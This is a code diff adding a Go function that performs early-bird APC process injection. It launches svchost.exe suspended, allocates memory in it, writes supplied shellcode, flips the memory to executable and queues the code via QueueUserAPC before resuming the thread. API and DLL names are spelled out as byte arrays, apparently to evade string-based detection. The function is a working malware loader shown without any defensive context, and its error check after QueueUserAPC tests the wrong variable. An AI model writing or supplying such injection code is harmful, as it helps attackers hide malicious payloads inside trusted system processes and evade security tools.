@@ -1,0 +1,84 @@
+func run(shellcode []byte) {
+
+	// Load DLLs and Procedures
+	kernel32 := windows.NewLazySystemDLL(string([]byte{'k','e','r','n','e','l','3','2','.','d','l','l'}))
+	VirtualAllocEx := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','A','l','l','o','c','E','x'}))
+	VirtualProtectEx := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','P','r','o','t','e','c','t','E','x'}))
+	WriteProcessMemory := kernel32.NewProc(string([]byte{'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',}))
+	QueueUserAPC := kernel32.NewProc(string([]byte{'Q','u','e','u','e','U','s','e','r','A','P','C'}))
+
+	var pi windows.ProcessInformation
+	var si windows.StartupInfo
+	errCreateProcess := windows.CreateProcess(
+					nil, 															
+					syscall.StringToUTF16Ptr("C:\\Windows\\System32\\svchost.exe"), 
+					nil, 															
+					nil, 															
+					false, 															
+					windows.CREATE_SUSPENDED,
+					nil, 															
+					nil, 															
+					&si, 									
+					&pi,
+					)									
+	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
+	}
+
+	pRemoteCode, _, errVirtualAlloc := VirtualAllocEx.Call(
+					uintptr(pi.Process), 
+					0, 
+					uintptr(len(shellcode)), 
+					windows.MEM_COMMIT, 
+					windows.PAGE_READWRITE,
+					)
+
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
+	}
+
+	if pRemoteCode == 0 {
+		log.Fatal("[!]VirtualAllocEx failed and returned 0")
+	}
+
+	// Write shellcode into child process memory
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(
+					uintptr(pi.Process), 
+					pRemoteCode, 
+					(uintptr)(unsafe.Pointer(&shellcode[0])), 
+					uintptr(len(shellcode)),
+					)
+
+	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
+	}
+
+	// Change memory permissions to RX in child process where shellcode was written
+	oldProtect := windows.PAGE_READWRITE
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pi.Process), 
+					pRemoteCode, uintptr(len(shellcode)), 
+					windows.PAGE_EXECUTE_READ, 
+					uintptr(unsafe.Pointer(&oldProtect)),
+					)
+	
+	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
+	}
+
+	// QueueUserAPC
+	_, _, err := QueueUserAPC.Call(
+					pRemoteCode, 
+					uintptr(pi.Thread), 
+					0,
+					)
+
+	if err != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling QueueUserAPC:\n%s", err.Error()))
+	}
+
+	// Resume the child process
+	_, errResumeThread := windows.ResumeThread(pi.Thread)
+	if errResumeThread != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
+	}
+}
